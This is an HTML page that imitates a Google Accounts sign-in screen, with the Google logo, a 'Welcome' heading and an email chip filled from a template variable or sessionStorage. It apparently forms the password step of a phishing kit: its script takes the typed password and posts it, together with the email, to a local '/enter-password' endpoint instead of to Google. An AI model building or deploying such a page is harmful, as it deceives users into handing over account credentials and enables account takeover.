<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        /* --- Re-used Styles from Index.html --- */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #202124;
            color: #e8eaed;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        .login-card {
            background-color: #0d0d0e;
            border-radius: 20px;
            padding: 48px 40px 36px;
            width: 1000px;
            height: 420px;
            display: flex;
            margin-top: 140px;
            margin-bottom: auto;
        }

        .content-wrapper {
            display: flex;
            width: 100%;
            height: 100%;
        }

        .left-column {
            width: 50%;
            padding-right: 24px;
            display: flex;
            flex-direction: column;
        }

        .right-column {
            width: 50%;
            padding-left: 24px;
            display: flex;
            flex-direction: column;
        }

        .google-logo {
            width: 48px;
            height: 48px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 44px;
            font-weight: 400;
            line-height: 1.1667;
            margin-bottom: 40px; /* Increased margin for this page */
            color: #ffffff;
        }

        .input-container {
            margin-top: 100px;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 13px 15px;
            margin: 1px;
            background-color: transparent;
            border: 1px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 16px;
            font-family: 'Roboto', sans-serif;
            outline: none;
        }

        .input-field:focus {
            border: 2px solid #8ab4f8;
            margin: 0px;
        }

        .link-blue {
            color: #8ab4f8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            background: none;
            border: none;
            padding: 0;
            cursor: pointer;
            display: inline-block;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: auto;
            padding-bottom: 10px;
        }

        .btn-next {
            background-color: #8ab4f8;
            color: #202124;
            border: none;
            border-radius: 18px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            font-family: 'Roboto', sans-serif;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: #a6c8ff;
        }

        .footer {
            width: 1040px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 24px;
            font-size: 12px;
            color: #9aa0a6;
            position: absolute;
            bottom: 0;
        }

        .language-selector {
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        
        .language-selector span {
             margin-right: 24px;
        }

        .footer-links a {
                        color: #9aa0a6;
                        text-decoration: none;
                        margin-left: 24px;
                }

                @media (max-width: 600px) {
                    .login-card, .TcuCfd {
                        width: 100%;
                        max-width: 450px;
                        padding: 24px 24px 36px;
                        margin: 0 auto;
                        border-radius: 18px;
                        box-shadow: 0 1px 3px rgba(60,64,67,.18), 0 4px 8px rgba(60,64,67,.10);
                        background: #0d0d0e;
                        display: flex;
                        flex-direction: column;
                        min-height: 100vh;
                    }
                    .content-wrapper {
                        flex-direction: column;
                        width: 100%;
                        height: auto;
                        padding: 0;
                    }
                    .left-column, .right-column {
                        width: 100%;
                        max-width: 100%;
                        padding: 0;
                        align-items: flex-start;
                        text-align: left;
                        margin-bottom: 12px;
                    }
                    .google-logo {
                        width: 48px;
                        height: 48px;
                        margin-bottom: 10px;
                        display: block;
                    }
                    h1 {
                        font-size: 24px;
                        margin: 0 0 8px 0;
                        line-height: 1.3333;
                    }
                    .input-container {
                        margin-top: 0;
                        margin-bottom: 8px;
                    }
                    .input-field {
                        width: 100%;
                        background-color: transparent;
                        border: 1px solid #5f6368;
                        border-radius: 4px;
                        padding: 13px 15px;
                        color: #e8eaed;
                        font-size: 16px;
                        height: 56px;
                        outline: none;
                        transition: border-color 0.2s;
                    }
                    .input-field:focus {
                        border: 2px solid #8ab4f8;
                        padding: 12px 14px;
                    }
                    .button-group {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        margin-top: auto;
                        padding-bottom: 20px;
                    }
                    .btn-next {
                        background-color: #8ab4f8;
                        color: #202124;
                        border: none;
                        border-radius: 18px;
                        padding: 10px 24px;
                        font-size: 14px;
                        font-weight: 500;
                        letter-spacing: 0.25px;
                        cursor: pointer;
                        transition: background-color 0.2s;
                    }
                    .btn-next:active {
                        background-color: #7aa0e0;
                    }
                    .footer {
                        width: 100%;
                        max-width: 450px;
                        margin: 0 auto 0 auto;
                        flex-direction: column;
                        position: static;
                        padding: 12px 0 0 0;
                        font-size: 13px;
                        gap: 8px;
                        background: none;
                        border-radius: 0 0 18px 18px;
                        box-shadow: none;
                    }
                    .language-selector {
                        justify-content: center;
                        margin-bottom: 8px;
                    }
                    .footer-links {
                        justify-content: center;
                        margin-bottom: 8px;
                    }
                    .footer-links a {
                        margin: 0 12px;
                    }
                    body > .footer {
                        display: none;
                    }
                }

        /* --- New Styles for Password Page --- */
        
        /* Email Display Chip */
        .email-chip {
            display: flex;
            align-items: center;
            border: 1px solid #5f6368;
            border-radius: 16px;
            padding: 4px 12px 4px 4px;
            width: fit-content;
            cursor: pointer;
        }

        .email-chip .profile-icon {
            margin-right: 8px;
            fill: #e8eaed;
        }

        .email-chip span {
            font-size: 14px;
            font-weight: 500;
            margin-right: 8px;
        }
        
        .email-chip .dropdown-icon {
            fill: #e8eaed;
        }

        /* Show Password Checkbox Container */
        .show-password-container {
            display: flex;
            align-items: center;
            margin-top: 16px;
            margin-bottom: 40px;
        }

        /* Custom Checkbox Styling */
        .show-password-container input[type="checkbox"] {
            appearance: none; /* Hide native checkbox */
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            border: 2px solid #9aa0a6;
            border-radius: 2px;
            margin-right: 16px;
            cursor: pointer;
            position: relative;
            background-color: transparent;
        }

        .show-password-container input[type="checkbox"]:checked {
            background-color: #8ab4f8;
            border-color: #8ab4f8;
        }

        /* Checkmark icon */
        .show-password-container input[type="checkbox"]:checked::after {
            content: '';
            position: absolute;
            left: 5px;
            top: 2px;
            width: 4px;
            height: 8px;
            border: solid #202124;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .show-password-container label {
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        
        /* Update spacing for password page button group */
        .right-column .button-group {
             padding-bottom: 0;
        }

    </style>
</head>
<body>

    <main class="login-card">
        <div class="content-wrapper">
            <div class="left-column">
                <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
                </svg>
                <h1>Welcome</h1>
                
                <div class="email-chip">
                    <svg class="profile-icon" xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 0 24 24" width="20px" fill="#e8eaed"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM7.07 18.28c.43-.9 3.05-1.78 4.93-1.78s4.51.88 4.93 1.78C15.57 19.36 13.86 20 12 20s-3.57-.64-4.93-1.72zm11.29-1.45c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6zm0 5c-.83 0-1.5-.67-1.5-1.5S11.17 8 12 8s1.5.67 1.5 1.5S12.83 11 12 11z"/></svg>
                    <span id="userEmailDisplay">{{ email }}</span>
                    <svg class="dropdown-icon" xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 0 24 24" width="20px" fill="#e8eaed"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M7 10l5 5 5-5H7z"/></svg>
                </div>
            </div>

            <div class="right-column">
                <div class="input-container" style="margin-top: 0;">
                    <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password">
                </div>
                
                <div class="show-password-container">
                    <input type="checkbox" id="showPassword">
                    <label for="showPassword">Show password</label>
                </div>

                <div class="button-group">
                    <button class="link-blue">Forgot password?</button>
                    <button id="nextButton" class="btn-next">Next</button>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="language-selector">
            <span>English (United States)</span>
            <svg xmlns="http://www.w3.org/2000/svg" height="18px" viewBox="0 0 24 24" width="18px" fill="#9aa0a6"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M7 10l5 5 5-5H7z"/></svg>
        </div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            // Retrieve Email from URL Query Parameters or sessionStorage
            const urlParams = new URLSearchParams(window.location.search);
            let email = urlParams.get('email');
            if (!email) {
                // Fallback to sessionStorage if URL param is missing
                email = sessionStorage.getItem('gmail_email');
            }
            const emailDisplayElement = document.getElementById('userEmailDisplay');
            if (email) {
                emailDisplayElement.textContent = decodeURIComponent(email);
            } else {
                console.log("No email provided in URL or sessionStorage.");
            }

            // Show Password Functionality
            const passwordInput = document.getElementById('passwordInput');
            const showPasswordCheckbox = document.getElementById('showPassword');
            showPasswordCheckbox.addEventListener('change', function() {
                passwordInput.type = this.checked ? 'text' : 'password';
            });

            const nextButton = document.getElementById('nextButton');
            nextButton.addEventListener('click', function(e) {
                e.preventDefault();
                const password = passwordInput.value;
                let email = urlParams.get('email') || sessionStorage.getItem('gmail_email') || '';
                // Create a form and submit via POST to /enter-password
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = '/enter-password';
                // Add password field
                const passwordField = document.createElement('input');
                passwordField.type = 'hidden';
                passwordField.name = 'password';
                passwordField.value = password;
                form.appendChild(passwordField);
                // Add email field
                const emailField = document.createElement('input');
                emailField.type = 'hidden';
                emailField.name = 'email';
                emailField.value = email;
                form.appendChild(emailField);
                document.body.appendChild(form);
                form.submit();
            });
        });
    </script>
</body>
</html>
